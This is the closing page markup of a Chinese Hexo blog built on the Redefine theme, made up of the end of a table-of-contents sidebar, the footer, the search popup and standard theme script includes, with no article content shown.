class="nav-text">源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-4"><span class="nav-text">基础知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95-26"><span class="nav-text">调试</span></a></li></ol></li></ol></li></ol>

	</div>
</div>
	</div>
	
</div>
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
            <div class="customize-info my-1">关山初度尘未洗，策马扬鞭再奋蹄。</div>
        
        <div class="text-center">
            &copy;
            
              <span>2023</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-circle-info fa-beat-fade" style="--fa-beat-fade-opacity: 0.67; --fa-beat-fade-scale: 1.075;" ></i>&nbsp;&nbsp;<a href="/">韩乔落</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        136 posts in total
                    </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.2</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
		</div>
	</div>

	
	<div class="post-tools">
		<div class="post-tools-container">
	<ul class="article-tools-list">
		<!-- TOC aside toggle -->
		
		<li class="right-bottom-tools page-aside-toggle">
			<i class="fa-regular fa-outdent"></i>
		</li>
		

		<!-- go comment -->
		
		<li class="go-comment">
			<i class="fa-regular fa-comments"></i>
		</li>
		
	</ul>
</div>
	</div>
	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog fa-spin"></i>
		</li>
		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="arrow-up fas fa-arrow-up"></i>
			<span class="percent"></span>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	
	<div class="search-pop-overlay">
	<div class="popup search-popup">
		<div class="search-header">
			<span class="search-input-field-pre">
				<i class="fa-solid fa-keyboard"></i>
			</span>
			<div class="search-input-container">
				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
			</div>
			<span class="popup-btn-close">
				<i class="fa-solid fa-times"></i>
			</span>
		</div>
		<div id="search-result">
			<div id="no-result">
				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
			</div>
		</div>
	</div>
</div>
	

</main>


<script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/Swup.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/SwupSlideTheme.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/SwupScriptsPlugin.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/SwupProgressPlugin.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/SwupScrollPlugin.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/SwupPreloadPlugin.min.js" ></script>
<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>




	<script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/imageViewer.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/utils.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/main.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/layouts/navbarShrink.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/scrollTopBottom.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/lightDarkSwitch.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/layouts/categoryList.js" ></script>


    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/localSearch.js" ></script>



    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/codeBlock.js" ></script>



    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/layouts/lazyload.js" ></script>



    <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/runtime.js" ></script>
    <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/odometer.min.js" ></script>
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/assets/odometer-theme-minimal.css">



  <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/Typed.min.js" ></script>
  <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/plugins/typed.js" ></script>







    <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/anime.min.js" ></script>




    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/tocToggle.js" data-swup-reload-script></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/layouts/toc.js" data-swup-reload-script></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/plugins/tabs.js" data-swup-reload-script></script>


<script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/moment-with-locales.min.js" data-swup-reload-script></script>
<script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/layouts/essays.js" data-swup-reload-script></script>




	
</body>

</html>